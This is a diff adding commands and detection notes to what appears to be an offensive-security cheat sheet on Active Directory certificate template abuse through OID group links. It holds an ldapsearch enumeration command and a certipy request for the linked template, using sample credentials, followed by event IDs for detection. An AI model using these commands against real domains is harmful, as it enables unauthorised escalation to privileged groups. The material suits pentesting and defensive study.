@@ -21,3 +21,17 @@ A certificate from the linked template grants the **group’s privileges in the 
 
 ### Commands
 ```bash
+# ── Enumerate the OID group link ─────────────────────────────────────
+ldapsearch -H ldap://10.10.10.5 -x -D 'lowpriv@corp.local' -w 'Password123!' \
+  -b "CN=OID,CN=Public Key Services,CN=Services,DC=corp,DC=local" \
+  msDS-OIDToGroupLink
+
+# ── Request the linked template ──────────────────────────────────────
+certipy req -u lowpriv@corp.local -p 'Password123!' \
+  -ca CORP-CA -template LinkedTemplate
+```
+
+### Detection
+OID group links to **Domain Admins/EA**; **5136** on OID objects; **4886** for the policy template.
+
+---
